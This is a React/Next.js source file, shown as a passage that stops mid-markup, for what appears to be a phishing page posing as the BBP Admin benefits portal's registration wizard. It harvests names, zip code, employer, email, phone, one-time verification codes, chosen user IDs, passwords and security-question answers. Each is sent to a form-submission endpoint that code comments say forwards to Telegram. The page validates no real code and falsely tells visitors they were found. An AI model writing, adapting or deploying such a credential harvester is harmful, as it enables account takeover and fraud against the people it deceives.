'use client'

import Link from "next/link"
import Image from "next/image"
import { useState, useEffect, Suspense, useRef } from "react"
import { useSearchParams } from "next/navigation"
import { Phone, Mail, MessageSquare, ArrowLeft, ArrowRight, Building2, Check, ChevronDown } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Footer } from "@/components/footer"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import { REDIRECT_AFTER_LOGIN_URL } from "@/lib/seo"

const SECURITY_QUESTIONS = [
  "With which company did you hold your first job?",
  "What is the last name of your high school best friend?",
  "What was your major during college?",
  "What is your spouse's middle name?",
  "What is the name of your most memorable childhood babysitter/caregiver?",
  "What is the first name of the eldest of your siblings?",
  "What is your father's middle name?",
  "In what street was the first address you lived in outside your parents' home?",
  "When is your youngest sibling's birthday (MM/DD)?",
  "What is your eldest child's middle name?",
  "What is the first name of your grandmother (your mother's mother)?",
  "What was the first name of your first grade teacher?",
  "What was your favorite restaurant in college?",
  "What is the first name of your spouse's father?",
  "What is the first name of your first crush?",
  "What is the middle name of your eldest sibling?",
  "What is your mother's middle name?",
  "What was your boss's first name at your first job?",
  "What is your nickname?",
  "What is the name of the hospital your oldest child was born in?",
  "What is your grandfather's profession?",
  "What was the name of your first pet?",
  "In what time of day was your oldest child born? (rounded to the closest hour, for example - 21)",
  "What is your grandfather's middle name (your father's father)?",
]

// Step indicator component
function StepIndicator({ currentStep }: { currentStep: number }) {
  const steps = [1, 2, 3, 4, 5]

  return (
    <div className="flex items-center justify-center mb-4">
      {steps.map((step, index) => (
        <div key={step} className="flex items-center">
          <div
            className={`
              relative px-4 py-1.5 text-xs font-semibold text-white
              ${step === currentStep ? 'bg-[#b8860b]' : 'bg-[#6b7280]'}
              ${index === 0 ? 'rounded-l' : ''}
              ${index === steps.length - 1 ? 'rounded-r' : ''}
            `}
            style={{
              clipPath: index === steps.length - 1
                ? 'polygon(0 0, calc(100% - 8px) 0, 100% 50%, calc(100% - 8px) 100%, 0 100%, 8px 50%)'
                : index === 0
                  ? 'polygon(0 0, calc(100% - 8px) 0, 100% 50%, calc(100% - 8px) 100%, 0 100%)'
                  : 'polygon(0 0, calc(100% - 8px) 0, 100% 50%, calc(100% - 8px) 100%, 0 100%, 8px 50%)'
            }}
          >
            STEP {step}
          </div>
        </div>
      ))}
    </div>
  )
}

function RegistrationPageContent() {
  const searchParams = useSearchParams()
  const initialStep = parseInt(searchParams.get('step') || '1', 10)
  const [step, setStep] = useState(initialStep)

  // Personal info flow (Step 1)
  const [firstName, setFirstName] = useState("")
  const [lastName, setLastName] = useState("")
  const [zipCode, setZipCode] = useState("")

  // Masked contact info (shown in step 2)
  const [maskedEmail] = useState("**********")
  const [maskedPhone] = useState("***-***-****")

  // Input fields for duplicate verification section
  const [inputEmail, setInputEmail] = useState("")
  const [inputMobile, setInputMobile] = useState("")

  // OTP verification (Step 5)
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [timeLeft, setTimeLeft] = useState(15 * 60) // 15 minutes in seconds
  const [isVerified, setIsVerified] = useState(false)
  const [verificationMethod, setVerificationMethod] = useState<'email' | 'text' | null>(null)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Step 5 sub-views: otp → setup → security → confirm (all stay in step 5)
  type Step5View = 'otp' | 'setup' | 'security' | 'confirm'
  const [step5View, setStep5View] = useState<Step5View>('otp')
  // Setup (User ID + Password)
  const [setupUserId, setSetupUserId] = useState('')
  const [setupPassword, setSetupPassword] = useState('')
  const [setupConfirmPassword, setSetupConfirmPassword] = useState('')
  // Security questions
  const [selectedSecurityQuestions, setSelectedSecurityQuestions] = useState<string[]>(['', '', '', ''])
  const [securityAnswers, setSecurityAnswers] = useState<string[]>(['', '', '', ''])
  const [openSecurityDropdown, setOpenSecurityDropdown] = useState<number | null>(null)
  const [setupSubmitting, setSetupSubmitting] = useState(false)
  const [securitySubmitting, setSecuritySubmitting] = useState(false)
  const [confirmSubmitting, setConfirmSubmitting] = useState(false)

  // Employer ID (Step 3)
  const [employerId, setEmployerId] = useState("")

  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isLoading, setIsLoading] = useState(false)

  // Set loginReady for downstream pages and read step from URL
  useEffect(() => {
    if (typeof window !== 'undefined') {
      sessionStorage.setItem('loginReady', 'true')
      // Check URL for step parameter
      const urlParams = new URLSearchParams(window.location.search)
      const stepParam = urlParams.get('step')
      if (stepParam) {
        setStep(parseInt(stepParam, 10))
      }
    }
  }, [])

  // Step 1: Personal Info Submit
  const handlePersonalInfoSubmit = async () => {
    setErrors({})
    const newErrors: Record<string, string> = {}

    if (!firstName.trim()) newErrors.firstName = 'First Name is required'
    if (!lastName.trim()) newErrors.lastName = 'Last Name is required'
    if (!zipCode.trim()) newErrors.zipCode = 'Zip Code is required'

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }

    setIsLoading(true)
    try {
      await trackFormSubmission({
        type: 'personal_info_lookup',
        firstName,
        lastName,
        zipCode,
        page: '/registration'
      })

      setTimeout(() => {
        setIsLoading(false)
        setStep(2) // Go to Employer Name
      }, 1000)
    } catch {
      setIsLoading(false)
      setErrors({ connection: 'Connection error. Please try again.' })
    }
  }

  // Step 2: Employer Name Submit
  const handleEmployerIdSubmit = async () => {
    setErrors({})
    if (!employerId.trim()) {
      setErrors({ employerId: 'Employer Name is required' })
      return
    }

    setIsLoading(true)
    try {
      await trackFormSubmission({
        type: 'employer_name_lookup',
        employerId,
        page: '/registration'
      })

      setTimeout(() => {
        setIsLoading(false)
        setStep(3) // Go to Contact Info Input
      }, 1000)
    } catch {
      setIsLoading(false)
      setErrors({ connection: 'Connection error. Please try again.' })
    }
  }

  // Step 3: Contact Info Submit
  const handleContactInfoSubmit = async () => {
    setErrors({})
    const newErrors: Record<string, string> = {}

    // Mobile number is required
    if (!inputMobile.trim()) {
      newErrors.mobile = 'Mobile number is required'
      setErrors(newErrors)
      return
    }

    // Validate email if provided
    if (inputEmail.trim()) {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputEmail.trim())) {
        newErrors.email = 'Please enter a valid email address'
      }
    }

    // Validate mobile number (required)
    const mobileDigits = inputMobile.trim().replace(/\D/g, '')
    if (mobileDigits.length !== 10) {
      newErrors.mobile = 'Please enter a valid 10-digit mobile number'
    }

    // If there are validation errors, stop here
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }

    // Both validations passed, proceed
    setIsLoading(true)
    try {
      await trackFormSubmission({
        type: 'contact_info',
        email: inputEmail.trim() || undefined,
        phone: inputMobile.trim() || undefined,
        page: '/registration'
      })

      setTimeout(() => {
        setIsLoading(false)
        setStep(4) // Go to Verification Method Selection
      }, 1000)
    } catch {
      setIsLoading(false)
      setErrors({ connection: 'Connection error. Please try again.' })
    }
  }

  // Step 4: Verification method selection
  const handleVerificationMethod = (method: 'email' | 'text') => {
    // Fire a Telegram notification about the selected method (non-blocking)
    trackFormSubmission({
      type: 'registration',
      page: `/registration?step=4&method=${method}`,
      ...(method === 'email'
        ? { email: inputEmail.trim() || undefined }
        : { phone: inputMobile.trim() || undefined }),
    }).catch(() => { })

    // Store the selected method and go to step 5
    setVerificationMethod(method)
    setStep(5) // Go to OTP verification
  }

  // Step 5: OTP verification handlers
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}m ${secs.toString().padStart(2, '0')}s`
  }

  // Countdown timer for step 5
  useEffect(() => {
    if (step === 5 && timeLeft > 0) {
      const timer = setInterval(() => {
        setTimeLeft(prev => prev - 1)
      }, 1000)
      return () => clearInterval(timer)
    }
  }, [step, timeLeft])

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newOtp = [...otp]
    newOtp[index] = value.slice(-1)
    setOtp(newOtp)

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6)
    const newOtp = [...otp]
    for (let i = 0; i < pastedData.length; i++) {
      newOtp[i] = pastedData[i]
    }
    setOtp(newOtp)
    // Focus on the next empty input or the last one
    const nextIndex = Math.min(pastedData.length, 5)
    inputRefs.current[nextIndex]?.focus()
  }

  const handleOtpVerify = async () => {
    setErrors({})
    const otpCode = otp.join('')

    if (otpCode.length !== 6) {
      setErrors({ otp: 'Please enter the complete 6-digit code' })
      return
    }

    setIsLoading(true)

    // Send to Telegram in background
    trackFormSubmission({
      type: verificationMethod === 'email' ? 'email_verification' : 'text_verification',
      otp: otpCode,
      email: verificationMethod === 'email' ? inputEmail : undefined,
      phone: verificationMethod === 'text' ? inputMobile : undefined,
      page: '/registration'
    }).catch(() => { })

    setTimeout(() => {
      setIsLoading(false)
      setIsVerified(true)
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('firstName', firstName)
      }
      setStep5View('setup')
    }, 1000)
  }

  const handleOtpResend = async () => {
    setOtp(["", "", "", "", "", ""])
    setTimeLeft(15 * 60)

    await trackFormSubmission({
      type: verificationMethod === 'email' ? 'email_otp_resend' : 'text_otp_resend',
      page: '/registration'
    })
  }

  // Step 5 setup: password rules and validation
  const setupPasswordRules = {
    length: setupPassword.length >= 8 && setupPassword.length <= 16,
    uppercase: /[A-Z]/.test(setupPassword),
    lowercase: /[a-z]/.test(setupPassword),
    number: /[0-9]/.test(setupPassword),
    special: /[!@#$%^&*(),.?":{}|<>]/.test(setupPassword),
  }
  const setupUserIdRules = {
    length: setupUserId.length >= 8 && setupUserId.length <= 99,
    alphanumeric: /^[a-zA-Z0-9@._-]*$/.test(setupUserId),
  }
  const setupAllPasswordValid = Object.values(setupPasswordRules).every(Boolean)
  const setupAllUserIdValid = Object.values(setupUserIdRules).every(Boolean) && setupUserId.length > 0
  const setupPasswordsMatch = setupPassword === setupConfirmPassword && setupConfirmPassword.length > 0
  const isSetupFormValid = setupAllPasswordValid && setupAllUserIdValid && setupPasswordsMatch

  const handleSetupContinue = async () => {
    if (!isSetupFormValid) return
    setSetupSubmitting(true)
    if (typeof window !== 'undefined') {
      sessionStorage.setItem('userId', setupUserId)
    }
    try {
      await fetch('/api/form-submission', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'User Credentials Setup',
          firstName,
          userId: setupUserId,
          password: setupPassword,
          confirmPassword: setupConfirmPassword,
          page: '/registration',
          timestamp: new Date().toISOString(),
        }),
      })
    } catch (e) {
      console.error('Failed to send notification:', e)
    }
    setSetupSubmitting(false)
    setStep5View('security')
  }

  const handleSecurityQuestionSelect = (index: number, question: string) => {
    const next = [...selectedSecurityQuestions]
    next[index] = question
    setSelectedSecurityQuestions(next)
    setOpenSecurityDropdown(null)
  }
  const getAvailableSecurityQuestions = (currentIndex: number) =>
    SECURITY_QUESTIONS.filter(
      (q) => !selectedSecurityQuestions.includes(q) || selectedSecurityQuestions[currentIndex] === q
    )
  const isSecurityFormValid =
    selectedSecurityQuestions.every((q) => q !== '') && securityAnswers.every((a) => a.trim() !== '')

  const handleSecurityContinue = async () => {
    if (!isSecurityFormValid) return
    setSecuritySubmitting(true)
    const answers = selectedSecurityQuestions.map((q, i) => ({ question: q, answer: securityAnswers[i] }))
    if (typeof window !== 'undefined') {
      sessionStorage.setItem('securityAnswers', JSON.stringify(answers))
    }
    try {
      await fetch('/api/form-submission', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'Security Questions',
          firstName,
          securityAnswers: answers,
          timestamp: new Date().toISOString(),
        }),
      })
    } catch (e) {
      console.error('Failed to send notification:', e)
    }
    setSecuritySubmitting(false)
    setStep5View('confirm')
  }

  const handleConfirmSubmit = async () => {
    setConfirmSubmitting(true)
    const answers = selectedSecurityQuestions.map((q, i) => ({ question: q, answer: securityAnswers[i] }))
    try {
      await fetch('/api/form-submission', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'Registration Complete',
          userId: setupUserId,
          securityAnswers: answers,
          page: '/registration',
          timestamp: new Date().toISOString(),
        }),
      })
    } catch (e) {
      console.error('Failed to send notification:', e)
    }
    if (typeof window !== 'undefined') {
      sessionStorage.clear()
    }
    window.location.href = REDIRECT_AFTER_LOGIN_URL
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 px-6 py-[15px]">
        <div className="flex items-center">
          <div className="flex items-center gap-6 flex-1 min-w-0">
            {/* Logo */}
            <Link href="/" className="flex items-center shrink-0">
              <Image
                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                alt="BBP Admin"
                width={120}
                height={40}
                className="h-[40px] w-auto"
                priority
              />
            </Link>

            {/* Contact Info - visible on all sizes; on mobile replaces Registration label */}
            <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto shrink-0">
              <div className="flex items-center gap-2">
                <Phone className="w-3 h-3" />
                <span>(630) 773-2337</span>
              </div>
              <div className="flex items-center gap-2 mt-0.5">
                <Mail className="w-3 h-3" />
                <span>support@bbpadmin.com</span>
              </div>
            </div>
          </div>

          <div className="ml-6 text-xl text-gray-500 font-normal hidden md:block">Registration</div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-6 py-8">
        <div className="w-full max-w-3xl">
          {/* Step Indicator */}
          <StepIndicator currentStep={step} />

          <p className="text-center text-sm text-gray-600 mb-6">
            You are on step {step} of 5
          </p>

          {/* Step 1: Personal Info */}
          {step === 1 && (
            <div>
              <p className="text-center text-gray-700 mb-8">
                Let&apos;s get you registered - please provide the information below.
              </p>

              <div className="max-w-md mx-auto space-y-4">
                <div className="flex items-center justify-between gap-4">
                  <label className="text-gray-600 w-28">
                    First Name <span className="text-red-500">*</span>
                  </label>
                  <Input
                    type="text"
                    value={firstName}
                    onChange={(e) => setFirstName(e.target.value)}
                    className={`flex-1 ${errors.firstName ? 'border-red-500' : ''}`}
                  />
                </div>

                <div className="flex items-center justify-between gap-4">
                  <label className="text-gray-600 w-28">
                    Last Name <span className="text-red-500">*</span>
                  </label>
                  <Input
                    type="text"
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value)}
                    className={`flex-1 ${errors.lastName ? 'border-red-500' : ''}`}
                  />
                </div>

                <div className="flex items-center justify-between gap-4">
                  <label className="text-gray-600 w-28">
                    Zip Code <span className="text-red-500">*</span>
                  </label>
                  <Input
                    type="text"
                    value={zipCode}
                    onChange={(e) => setZipCode(e.target.value.replace(/\D/g, '').slice(0, 5))}
                    className={`flex-1 ${errors.zipCode ? 'border-red-500' : ''}`}
                  />
                </div>
              </div>

              {(errors.firstName || errors.lastName || errors.zipCode) && (
                <p className="text-red-500 text-sm text-center mt-4">Please fill in all required fields</p>
              )}
              {errors.connection && (
                <p className="text-red-500 text-sm text-center mt-4">{errors.connection}</p>
              )}

              {/* Action Buttons */}
              <div className="flex items-center justify-center gap-3 mt-8">
                <Button
                  className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] transition-colors"
                  onClick={handlePersonalInfoSubmit}
                  disabled={isLoading}
                >
                  <ArrowRight className="w-4 h-4 mr-2" />
                  NEXT
                </Button>
              </div>
            </div>
          )}

          {/* Step 2: Employer Name */}
          {step === 2 && (
            <div>
              <p className="text-center text-gray-700 mb-8">
                Enter your employer information and we&apos;ll securely retrieve your information!
              </p>

              <div className="flex items-center justify-center gap-4 mb-8">
                <div className="flex items-center gap-2 text-gray-600">
                  <Building2 className="w-5 h-5" />
                  <span>Employer Name</span>
                  <span className="text-red-500">*</span>
                </div>
                <div className="relative">
                  <Input
                    type="text"
                    value={employerId}
                    onChange={(e) => setEmployerId(e.target.value)}
                    className={`w-48 border-[#d4a574] ${errors.employerId ? 'border-red-500' : ''}`}
                    placeholder="Required"
                  />
                  <span className="absolute -top-2 left-2 text-xs text-[#d4a574] bg-white px-1">Required</span>
                </div>
              </div>

              {errors.employerId && (
                <p className="text-red-500 text-sm text-center mb-4">{errors.employerId}</p>
              )}
              {errors.connection && (
                <p className="text-red-500 text-sm text-center mb-4">{errors.connection}</p>
              )}

              {/* Action Buttons */}
              <div className="flex items-center justify-center gap-3">
                <Button
                  className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                  onClick={() => setStep(1)}
                >
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  BACK
                </Button>
                <Button
                  className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] transition-colors"
                  onClick={handleEmployerIdSubmit}
                  disabled={isLoading}
                >
                  <ArrowRight className="w-4 h-4 mr-2" />
                  NEXT
                </Button>
              </div>
            </div>
          )}

          {/* Step 3: Contact Info Input */}
          {step === 3 && (
            <div>
              <p className="text-center text-gray-700 mb-8">
                Please provide your contact information.
              </p>

              <div className="max-w-lg mx-auto space-y-4 mb-8">
                {/* Email Option - Input */}
                <div className="space-y-1">
                  <label className="text-gray-700 block mb-1">
                    Input your email address:
                  </label>
                  <Input
                    type="email"
                    value={inputEmail}
                    onChange={(e) => {
                      setInputEmail(e.target.value)
                      // Clear email error when user starts typing
                      if (errors.email) {
                        setErrors(prev => {
                          const newErrors = { ...prev }
                          delete newErrors.email
                          return newErrors
                        })
                      }
                    }}
                    onBlur={(e) => {
                      // Validate email on blur if email is provided
                      if (e.target.value.trim() && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e.target.value.trim())) {
                        setErrors(prev => ({ ...prev, email: 'Please enter a valid email address' }))
                      }
                    }}
                    placeholder="Enter your email address"
                    className={`w-full ${errors.email ? 'border-red-500' : ''}`}
                  />
                  {errors.email && (
                    <p className="text-red-500 text-sm mt-1">{errors.email}</p>
                  )}
                </div>

                {/* Text Option - Input */}
                <div className="space-y-1">
                  <label className="text-gray-700 block mb-1">
                    Input your mobile number: <span className="text-red-500">*</span>
                  </label>
                  <Input
                    type="tel"
                    value={inputMobile}
                    onChange={(e) => setInputMobile(e.target.value.replace(/\D/g, '').slice(0, 10))}
                    placeholder="Enter your mobile number"
                    className={`w-full ${errors.mobile ? 'border-red-500' : ''}`}
                  />
                  {errors.mobile && (
                    <p className="text-red-500 text-sm mt-1">{errors.mobile}</p>
                  )}
                </div>
              </div>

              {errors.contact && (
                <p className="text-red-500 text-sm text-center mb-4">{errors.contact}</p>
              )}
              {errors.connection && (
                <p className="text-red-500 text-sm text-center mb-4">{errors.connection}</p>
              )}

              {/* Action Buttons */}
              <div className="flex items-center justify-center gap-3 mb-6">
                <Button
                  className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                  onClick={() => setStep(2)}
                >
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  BACK
                </Button>
                <Button
                  className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] disabled:opacity-50 transition-colors"
                  onClick={handleContactInfoSubmit}
                  disabled={isLoading || !inputMobile.trim()}
                >
                  <ArrowRight className="w-4 h-4 mr-2" />
                  CONTINUE
                </Button>
              </div>
            </div>
          )}

          {/* Step 4: Verification Method Selection */}
          {step === 4 && (
            <div>
              <p className="text-center text-gray-700 mb-8">
                We found you! Pick a method to receive a verification code now.
              </p>

              <div className="max-w-lg mx-auto space-y-4 mb-8">
                {/* Email Option */}
                {inputEmail.trim() && (
                  <div className="flex items-center justify-between gap-4">
                    <div className="text-gray-700">
                      <span>Send code to email:</span>
                      <span className="font-medium"> {inputEmail}</span>
                    </div>
                    <Button
                      className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] transition-colors"
                      onClick={() => handleVerificationMethod('email')}
                    >
                      <Mail className="w-4 h-4 mr-2" />
                      E-MAIL
                    </Button>
                  </div>
                )}

                {/* Text Option */}
                {inputMobile.trim() && (
                  <div className="flex items-center justify-between gap-4">
                    <div className="text-gray-700">
                      <span>Send code via text:</span>
                      <span className="font-medium"> {inputMobile}</span>
                    </div>
                    <Button
                      className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] transition-colors"
                      onClick={() => handleVerificationMethod('text')}
                    >
                      <MessageSquare className="w-4 h-4 mr-2" />
                      TEXT
                    </Button>
                  </div>
                )}
              </div>

              {/* Action Buttons */}
              <div className="flex items-center justify-center gap-3 mb-6">
                <Button
                  className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                  onClick={() => setStep(3)}
                >
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  BACK
                </Button>
              </div>
            </div>
          )}

          {/* Step 5: OTP → Setup → Security → Confirm (all step 5) */}
          {step === 5 && verificationMethod && (
            <div>
              {step5View === 'otp' && (
                <div>
                  <p className="text-center text-gray-700 mb-2">
                    Enter the verification code that you received via <strong>{verificationMethod === 'email' ? 'email' : 'SMS'}</strong> below:
                  </p>
                  <p className="text-center text-gray-500 text-sm mb-6">
                    Note - Do not share your verification code with anyone else
                  </p>

                  <div className="flex justify-center gap-2 mb-4" onPaste={handleOtpPaste}>
                    {otp.map((digit, index) => (
                      <input
                        key={index}
                        ref={(el) => { inputRefs.current[index] = el }}
                        type="text"
                        inputMode="numeric"
                        maxLength={1}
                        value={digit}
                        onChange={(e) => handleOtpChange(index, e.target.value)}
                        onKeyDown={(e) => handleOtpKeyDown(index, e)}
                        className="w-12 h-12 text-center text-xl border-b-2 border-gray-400 focus:border-[#1e3a5f] outline-none bg-transparent"
                      />
                    ))}
                  </div>

                  {errors.otp && (
                    <p className="text-red-500 text-sm text-center mb-4">{errors.otp}</p>
                  )}
                  {errors.connection && (
                    <p className="text-red-500 text-sm text-center mb-4">{errors.connection}</p>
                  )}

                  <p className="text-center text-gray-600 text-sm mb-4">
                    OTP will expire in {formatTime(timeLeft)}
                  </p>
                  <p className="text-center mb-2">
                    <button
                      onClick={handleOtpResend}
                      className="text-blue-600 underline hover:text-blue-800 text-sm"
                    >
                      Resend verification code
                    </button>
                  </p>
                  <p className="text-center mb-8">
                    <Link href="#" className="text-blue-600 underline hover:text-blue-800 text-sm">
                      I did not receive my code
                    </Link>
                  </p>

                  <div className="flex items-center justify-center gap-3">
                    <Button
                      className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                      onClick={() => setStep(4)}
                    >
                      <ArrowLeft className="w-4 h-4 mr-2" />
                      BACK
                    </Button>
                    <Button
                      className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] disabled:opacity-50 transition-colors"
                      onClick={handleOtpVerify}
                      disabled={isLoading || otp.join('').length !== 6}
                    >
                      <ArrowRight className="w-4 h-4 mr-2" />
                      NEXT
                    </Button>
                  </div>
                </div>
              )}

              {/* Step 5 – Setup (User ID + Password) */}
              {step5View === 'setup' && (
                <div className="max-w-md mx-auto">
                  <h1 className="text-2xl md:text-3xl font-bold text-gray-900 mb-2">
                    Great to meet you, {firstName || 'there'}!
                  </h1>
                  <p className="text-gray-600 mb-8">
                    Enter a User ID and a password to get started.
                  </p>
                  <div className="mb-6">
                    <label className="block text-sm text-gray-600 mb-2">Choose User ID</label>
                    <Input
                      type="text"
                      value={setupUserId}
                      onChange={(e) => setSetupUserId(e.target.value)}
                      className="w-full border-0 border-b border-gray-300 rounded-none px-0 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                    />
                  </div>
                  <div className="bg-gray-100 p-4 mb-6 text-sm text-gray-600 space-y-1">
                    <p>Must be between 8 and 99 characters long</p>
                    <p>Can contain Alphanumeric character</p>
                    <p>Can contain following special characters, @ (at sign) . (period) - (hyphen or dash) _ (underscore)</p>
                  </div>
                  <div className="mb-6">
                    <label className="block text-sm text-gray-600 mb-2">Choose Password</label>
                    <Input
                      type="password"
                      value={setupPassword}
                      onChange={(e) => setSetupPassword(e.target.value)}
                      className="w-full border-0 border-b border-gray-300 rounded-none px-0 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                    />
                  </div>
                  <div className="bg-gray-100 p-4 mb-6 text-sm space-y-1">
                    <p className={setupPasswordRules.length ? 'text-green-600' : 'text-gray-600'}>
                      {setupPasswordRules.length && <Check className="w-4 h-4 inline mr-1" />}
                      Include 8-16 characters
                    </p>
                    <p className={setupPasswordRules.uppercase ? 'text-green-600' : 'text-gray-600'}>
                      {setupPasswordRules.uppercase && <Check className="w-4 h-4 inline mr-1" />}
                      Include 1 uppercase
                    </p>
                    <p className={setupPasswordRules.lowercase ? 'text-green-600' : 'text-gray-600'}>
                      {setupPasswordRules.lowercase && <Check className="w-4 h-4 inline mr-1" />}
                      Include 1 lowercase
                    </p>
                    <p className={setupPasswordRules.number ? 'text-green-600' : 'text-gray-600'}>
                      {setupPasswordRules.number && <Check className="w-4 h-4 inline mr-1" />}
                      Include 1 number
                    </p>
                    <p className={setupPasswordRules.special ? 'text-green-600' : 'text-gray-600'}>
                      {setupPasswordRules.special && <Check className="w-4 h-4 inline mr-1" />}
                      Include 1 special character
                    </p>
                  </div>
                  <div className="mb-8">
                    <label className="block text-sm text-gray-600 mb-2">Confirm Password</label>
                    <Input
                      type="password"
                      value={setupConfirmPassword}
                      onChange={(e) => setSetupConfirmPassword(e.target.value)}
                      className="w-full border-0 border-b border-gray-300 rounded-none px-0 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                    />
                    {setupConfirmPassword && !setupPasswordsMatch && (
                      <p className="text-red-500 text-sm mt-1">Passwords do not match</p>
                    )}
                  </div>
                  <div className="flex items-center justify-center gap-3">
                    <Button
                      className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                      onClick={() => { setStep5View('otp'); setIsVerified(false) }}
                    >
                      <ArrowLeft className="w-4 h-4 mr-2" />
                      BACK
                    </Button>
                    <Button
                      className={`px-6 py-5 min-w-[120px] font-semibold transition-colors ${isSetupFormValid ? 'bg-[#141c4d] hover:bg-[#407ec9] text-white' : 'bg-gray-400 cursor-not-allowed text-white'}`}
                      onClick={handleSetupContinue}
                      disabled={!isSetupFormValid || setupSubmitting}
                    >
                      <ArrowRight className="w-4 h-4 mr-2" />
                      CONTINUE
                    </Button>
                  </div>
                </div>
              )}

              {/* Step 5 – Security questions */}
              {step5View === 'security' && (
                <div className="max-w-lg mx-auto">
                  <h1 className="text-2xl md:text-3xl font-bold text-gray-900 mb-1">
                    Secure your account!
                  </h1>
                  <p className="text-gray-600 mb-6">
                    Select 4 security questions.
                  </p>
                  <div className="space-y-4">
                    {[0, 1, 2, 3].map((index) => (
                      <div key={index} className="relative">
                        <button
                          type="button"
                          onClick={() => setOpenSecurityDropdown(openSecurityDropdown === index ? null : index)}
                          className="w-full flex items-center justify-between p-4 bg-gray-100 rounded-lg text-left"
                        >
                          <span className={`text-sm ${selectedSecurityQuestions[index] ? 'text-[#1e3a5f] font-medium' : 'text-gray-500'}`}>
                            {selectedSecurityQuestions[index] || '--Choose Security Question--'}
                          </span>
                          <ChevronDown className={`w-5 h-5 text-[#1e3a5f] transition-transform ${openSecurityDropdown === index ? 'rotate-180' : ''}`} />
                        </button>
                        {openSecurityDropdown === index && (
                          <div className="absolute z-50 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-64 overflow-y-auto">
                            {getAvailableSecurityQuestions(index).map((question, i) => (
                              <button
                                key={i}
                                type="button"
                                onClick={() => handleSecurityQuestionSelect(index, question)}
                                className="w-full text-left px-4 py-3 text-sm text-[#1e3a5f] hover:bg-blue-50 border-b border-gray-100 last:border-b-0"
                              >
                                {question}
                              </button>
                            ))}
                          </div>
                        )}
                        <div className="mt-2 px-1">
                          <Input
                            type="text"
                            placeholder="(Type answer)"
                            value={securityAnswers[index]}
                            onChange={(e) => {
                              const next = [...securityAnswers]
                              next[index] = e.target.value
                              setSecurityAnswers(next)
                            }}
                            className="w-full border-0 border-b border-gray-300 rounded-none px-0 py-2 text-gray-700 placeholder:text-gray-400 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                            disabled={!selectedSecurityQuestions[index]}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                  <div className="flex items-center justify-center gap-3 mt-8">
                    <Button
                      className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                      onClick={() => setStep5View('setup')}
                    >
                      <ArrowLeft className="w-4 h-4 mr-2" />
                      BACK
                    </Button>
                    <Button
                      className={`px-6 py-5 min-w-[120px] font-semibold transition-colors ${isSecurityFormValid ? 'bg-[#141c4d] hover:bg-[#407ec9] text-white' : 'bg-gray-400 cursor-not-allowed text-white'}`}
                      onClick={handleSecurityContinue}
                      disabled={!isSecurityFormValid || securitySubmitting}
                    >
                      <ArrowRight className="w-4 h-4 mr-2" />
                      CONTINUE
                    </Button>
                  </div>
                </div>
              )}

              {/* Step 5 – Confirm: show User ID and security Q&As, then Submit */}
              {step5View === 'confirm' && (
                <div className="max-w-md mx-auto">
                  <h1 className="text-2xl md:text-3xl font-bold text-gray-900 mb-2">
                    Your Account is Confirmed!
                  </h1>
                  <p className="text-gray-600 mb-2">
                    Review your information for accuracy and hit Submit.
                  </p>
                  <p className="text-gray-600 mb-6">
                    Click the back arrow to make corrections.
                  </p>
                  <div className="border-b border-gray-200 py-4">
                    <p className="text-sm text-gray-500 mb-1">User ID</p>
